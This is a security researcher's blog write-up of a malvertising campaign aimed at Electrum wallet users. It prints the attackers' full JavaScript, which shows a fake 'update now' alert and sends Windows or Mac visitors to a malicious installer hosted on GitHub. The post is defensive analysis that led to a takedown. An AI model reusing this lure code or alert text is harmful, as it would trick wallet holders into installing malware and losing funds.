<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Write-up on a new malware campaign targeting users of Electrum, a Bitcoin wallet, which emerged primarily on February 22nd'><title>Electrum Malware Campaign</title>

<link rel='canonical' href='https://honk.camp/p/electrum-malware-campaign/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='Electrum Malware Campaign'>
<meta property='og:description' content='Write-up on a new malware campaign targeting users of Electrum, a Bitcoin wallet, which emerged primarily on February 22nd'>
<meta property='og:url' content='https://honk.camp/p/electrum-malware-campaign/'>
<meta property='og:site_name' content='honk.camp'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='electrum' /><meta property='article:published_time' content='2021-02-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2021-02-22T00:00:00&#43;00:00'/>
<meta name="twitter:title" content="Electrum Malware Campaign">
<meta name="twitter:description" content="Write-up on a new malware campaign targeting users of Electrum, a Bitcoin wallet, which emerged primarily on February 22nd">
    </head>
    <body class="">
        <div class="container flex on-phone--column align-items--flex-start extended article-page with-toolbar">
            <aside class="sidebar left-sidebar sticky">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header class="site-info">
        
            <figure class="site-avatar">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu09708bc55717c97a187e664e56a836fc_1890324_300x0_resize_box_2.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                

                
            </figure>
        
        <h1 class="site-name"><a href="https://honk.camp">honk.camp</a></h1>
        <h2 class="site-description">Web security researcher</h2>
    </header>

    <ol class="menu" id="main-menu">
        
        
        

        <li >
            <a href='/'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="5 12 3 12 12 3 21 12 19 12" />
  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
</svg>



                
                <span>Home</span>
            </a>
        </li>
        
        

        <li >
            <a href='/about'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="7" r="4" />
  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
</svg>



                
                <span>About</span>
            </a>
        </li>
        
        

        <li >
            <a href='/archives'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <rect x="3" y="4" width="18" height="4" rx="2" />
  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
  <line x1="10" y1="12" x2="14" y2="12" />
</svg>



                
                <span>Archives</span>
            </a>
        </li>
        
        

        <li >
            <a href='/search'>
                
                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="10" cy="10" r="7" />
  <line x1="21" y1="21" x2="15" y2="15" />
</svg>



                
                <span>Search</span>
            </a>
        </li>
        
    </ol>
</aside>

            <main class="main full-width">
    <div id="article-toolbar">
        <a href="https://honk.camp" class="back-home">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



            <span>Back</span>
        </a>
    </div>

    <article class="main-article">
    <header class="article-header">

    <div class="article-details">
    
    <header class="article-category">
        
            
                <a href="/categories/writeup/">writeup</a>
            
        
            
                <a href="/categories/campaign/">campaign</a>
            
        
    </header>
    

    <h2 class="article-title">
        <a href="/p/electrum-malware-campaign/">Electrum Malware Campaign</a>
    </h2>

    
    <h3 class="article-subtitle">
        Write-up on a new malware campaign targeting users of Electrum, a Bitcoin wallet, which emerged primarily on February 22nd
    </h3>
    <footer class="article-time">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <time class="article-time--published">Feb 22, 2021</time>
    </footer></div>
</header>

    <section class="article-content">
    <h3 id="targeting">Targeting</h3>
<p>The main method of targetting users seems to be via a malicious Google Ads campaign. The main site where users seem to be encountering this is Reddit, <a class="link" href="https://reddit.com/r/redditads/comments/lplve0/popup_html_alert_box_about_electrum_wallet_being/"  target="_blank" rel="noopener"
    >as seen in this Reddit thread posted</a>. This seems to be executing JS to make an alert telling users to update Electrum and making an executable download via opening another browser (we will talk about how later in the HTML code review). This can be seen in the apparent content of the alert as said in the Reddit thread:</p>
<blockquote>
<p>Electrum versions older than 4.0.9 have a vulnerability. Please update Electrum to avoid losing funds.</p>
</blockquote>
<p>However, the thread is especially useful as the pasted text includes the origin of the iframe: (with escaped URL)</p>
<blockquote>
<p>An embedded page at electrum-4[dot]github[dot]io says:</p>
</blockquote>
<h3 id="the-site">The site</h3>
<p>As apparent from the url of the site, it is a GitHub Pages site. <a class="link" href="https://pages.github.com"  target="_blank" rel="noopener"
    >GitHub Pages</a> allows GitHub, a public Git hosting provider (among other services and features), users a way to easily host their repositories online with subdomains under &ldquo;[username].github.io&rdquo;.</p>
<h3 id="the-github-user">The GitHub user</h3>
<p>As it is GitHub Pages, this means the repository could be public, but depends on the how the user set it up. In this instance, by looking at <a class="link" href="https://github.com/electrum-4"  target="_blank" rel="noopener"
    >the user&rsquo;s page</a>, finding it by just plugging it into &ldquo;github.com/[username]&rdquo; from the GitHub Pages subdomain, we can see the repository is open source and public.</p>
<h3 id="the-sites-source">The site&rsquo;s source</h3>
<h4 id="indexhtml"><code>index.html</code></h4>
<p>The index page has a simple user interface, a loading animation. But we are more interested in the JS running in the background. The JS running is quite small, here is the entire source:</p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="k">if</span> <span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s1">&#39;Mac OS&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
	<span class="nx">top</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;https://raw.githubusercontent.com/electrum-4/electrum/main/electrum-4.0.9.dmg&#39;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
	<span class="nx">top</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;https://raw.githubusercontent.com/electrum-4/electrum/main/electrum-4.0.9-setup.exe&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
	<span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">&#34;https://electrum.org/&#34;</span><span class="p">;</span>
<span class="p">},</span> <span class="mi">7000</span><span class="p">);</span>
</code></pre></div><p>A small step-by-step analysis:</p>
<ul>
<li>Detect if the website is being ran on a Mac OS device:
<ul>
<li>If so: download a .dmg file</li>
<li>If not: download a .exe file</li>
</ul>
</li>
<li>After 7 seconds redirect to <a class="link" href="https://electrum.org"  target="_blank" rel="noopener"
    >the official Electrum site</a></li>
</ul>
<h4 id="electrumhtml"><code>electrum.html</code></h4>
<p>I am pretty sure this is the HTML which is inside the iframe which ran. It is very similar to the <code>index.html</code> in concept, however without the UI and with different download methods.</p>
<p>The JavaScript (ran via script):</p>
<div class="highlight"><pre class="chroma"><code class="language-js" data-lang="js"><span class="k">if</span> <span class="p">(</span><span class="nx">navigator</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&#34;Windows&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
	<span class="nx">alert</span><span class="p">(</span><span class="s2">&#34;\n\nElectrum versions older than 4.0.9 have a vulnerability. Please update Electrum to avoid losing funds.\n\n&#34;</span><span class="p">);</span>
	<span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">&#39;microsoft-edge:https://electrum-4.github.io/&#39;</span><span class="p">;</span>
<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">navigator</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&#34;Mac OS&#34;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="p">{</span>
	<span class="nx">prompt</span><span class="p">(</span><span class="s2">&#34;\n\nElectrum versions older than 4.0.9 have a vulnerability. Please update Electrum to avoid losing funds.\n\nCopy the following URL and paste it to your browser address bar:\n&#34;</span><span class="p">,</span> <span class="s2">&#34;https://electrum-4.github.io/&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>Another small step-by-step analysis:</p>
<ul>
<li>If on Windows:
<ul>
<li>Alert the user to trick them into downloading and running the malicious executable</li>
<li>Try and download it by attempting to open Microsoft Edge with the link to the main index page</li>
</ul>
</li>
<li>Else, if on Mac OS:
<ul>
<li>Make a prompt to try and get the user to open the main index page into their browser</li>
</ul>
</li>
</ul>
<h3 id="the-binaries">The binaries</h3>
<p>The binaries are stored in another GitHub repo under the same user (<code>electrum-4/electrum</code>), as the JS in the site uses a raw GitHub URL (a way of accessing a file in a GitHub repo directly via a URL) to download the binaries. I will not go into the actual binaries here as I am not experienced with that side.</p>
<h3 id="final-notes">Final Notes</h3>
<p>I have contacted GitHub with a link to this writeup to attempt to get the user / repos taken down to prevent further users from being attacked. Thanks.</p>
<h3 id="trivia--extra-info">Trivia / Extra Info</h3>
<ul>
<li>Whilst the GitHub Pages repo is committed via the GitHub user, the actual repo with the binaries has commits made by the author <code>root &lt;root@vps.server.local&gt;</code></li>
</ul>
<h3 id="update-1820-utc">Update (18:20 UTC)</h3>
<p>GitHub has now taken the user down, resulting in the binaries no longer being hosted and the GitHub Pages site now no longer being online, meaning no new users can be attacked.</p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/electrum/">electrum</a>
        
    </section>


    </footer>

    
</article>

    <aside class="related-contents--wrapper">
    
    
        <h2 class="section-title">Related contents</h2>
        <div class="related-contents">
            <div class="flex article-list--tile">
                
                    
<article class="">
    <a href="/p/malware-promotion-via-fake-forums/">
        
        

        <div class="article-details">
            <h2 class="article-title">Malware Promotion via Fake Forums</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/p/gooseupdate-v3-codebase-design/">
        
        

        <div class="article-details">
            <h2 class="article-title">GooseUpdate v3 Codebase Design</h2>
        </div>
    </a>
</article>
                
                    
<article class="">
    <a href="/p/discords-telemetry-on-websocket-connect/">
        
        

        <div class="article-details">
            <h2 class="article-title">Discord&#39;s Telemetry on WebSocket Connect</h2>
        </div>
    </a>
</article>
                
            </div>
        </div>
    
</aside>


    
        
    

    <footer class="site-footer">
    <section class="copyright">&copy; 2021 honk.camp</section>
    <section class="powerby">Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="1.1.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true" style="display:none">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>
            </main>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"
    integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin="anonymous"></script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>
<link rel="stylesheet" href="/css/highlight/dark.min.css">

    </body>
</html>
